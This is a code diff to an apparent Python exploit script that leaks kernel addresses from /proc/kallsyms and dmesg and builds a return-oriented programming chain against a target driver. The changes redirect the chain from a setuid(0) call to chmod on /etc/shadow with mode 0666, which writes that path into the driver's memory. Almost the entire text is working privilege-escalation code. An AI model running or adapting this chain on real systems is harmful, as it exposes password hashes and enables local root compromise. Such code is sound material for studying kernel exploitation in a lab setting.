@@ -70,8 +70,6 @@ class Adjuster(object):
         self.offset += int(add)
         return self.offset
 
-adjuster = Adjuster()
-
 def chmod_addr():
     with open('/proc/kallsyms', 'rb') as i:
         return int([l.split()[0] for l in i.read().decode('utf-8').split('\n')
@@ -109,7 +107,7 @@ def write4(rop, gadget_file, adjuster, string_location, string):
     # rop.raw(adjuster(0x80da3))
     return rop
 
-def build(leak, gadget_file, sled_length):
+def build(leak, gadget_file, sled_length, adjuster):
     # Load the target binary
     with open(gadget_file, 'rb') as i:
         binary = ELF.from_bytes(i.read(), vma=leak)
@@ -127,14 +125,13 @@ def build(leak, gadget_file, sled_length):
     # Build a string in the .bss section of the target driver
     # the .bss section starts at the address the driver was loaded
     # We have to adjust because the gadget we have is rdi + 0x2a50
-    '''
     string_location = adjuster(section('.bss', gadget_file))
     print('string_location:', hex(string_location))
 
-    rop = write4(rop, gadget_file, adjuster, string_location, b'cte/')
-    rop = write4(rop, gadget_file, adjuster, string_location + 4, b'ahs/')
-    rop = write4(rop, gadget_file, adjuster, string_location + 8, b'\x00wod')
-    '''
+    # rop = write4(rop, gadget_file, adjuster, string_location, b'/tmp')
+    rop = write4(rop, gadget_file, adjuster, string_location, b'/etc')
+    rop = write4(rop, gadget_file, adjuster, string_location + 4, b'/sha')
+    rop = write4(rop, gadget_file, adjuster, string_location + 8, b'dow\x00')
 
     # Now call chmod
 
@@ -142,17 +139,18 @@ def build(leak, gadget_file, sled_length):
     rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
     # rop.raw(adjuster(0x2f0eb))
     # set rax
-    rop.raw(0x69)
+    rop.raw(0x5a)
+    # rop.raw(0x69)
     # pop rdi; ret;
     rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
     # rop.raw(adjuster(0x257e9))
     # set rdi for setuid 0
-    rop.raw(0x0)
-    # rop.raw(string_location)
+    # rop.raw(0x0)
+    rop.raw(string_location)
     # pop rsi; ret;
-    # rop.raw(adjuster(gadget('pop %rsi; ret;', gadget_file)))
+    rop.raw(adjuster(gadget('pop %rsi; ret;', gadget_file)))
     # set rsi
-    # rop.raw(0o666)
+    rop.raw(0o666)
     # syscall; NULL
     rop.raw(adjuster(gadget('syscall;', gadget_file)))
     # rop.raw(0x0)
@@ -164,29 +162,26 @@ def build(leak, gadget_file, sled_length):
     # Return it as bytes to be writen out
     return bytes(rop)
 
-def create_exploit(target_binary, payload_file, sled_length, leak):
-    exploit = build(leak, target_binary, sled_length)
+def create_exploit(target_binary, payload_file, sled_length, leak, adjuster):
+    exploit = build(leak, target_binary, sled_length, adjuster)
     with open(payload_file, 'wb') as o:
         o.write(exploit)
     return exploit
 
 def attack_userspace(target_binary, payload_file, sled_length):
-    # For ELF offset
-    global adjuster
-    adjuster = Adjuster(0x40)
-
     leak, leaker = leaked(['./userspace', target_binary, payload_file],
             target_binary)
     print('Leaked address is', str(hex(leak)))
-    exploit = create_exploit(target_binary, payload_file, sled_length, leak)
+    exploit = create_exploit(target_binary, payload_file, sled_length, leak, Adjuster(0x40))
     leaker.shutdown('send')
     leaker.shutdown()
+    print(leaker.recvall().decode('utf-8'))
 
-def attack_kernel(target_binary, payload_file, sled_length):
+def attack_kernel(target_binary, payload_file, sled_length, adjuster):
     leak, leaker = leaked(['dmesg', '--color=never'], target_binary)
     leaker.shutdown()
     print('Leaked address is', str(hex(leak)))
-    exploit = create_exploit(target_binary, payload_file, sled_length, leak)
+    exploit = create_exploit(target_binary, payload_file, sled_length, leak, Adjuster(0x0))
     args = ['./query_app']
     print(args)
     p = process(args)
@@ -215,7 +210,7 @@ def main():
             attack_kernel(target_binary, payload_file, sled_length)
     else:
         leak = int(sys.argv[5], 16)
-        create_exploit(target_binary, payload_file, sled_length, leak)
+        create_exploit(target_binary, payload_file, sled_length, leak, Adjuster(0x40))
 
 if __name__ == '__main__':
     main()
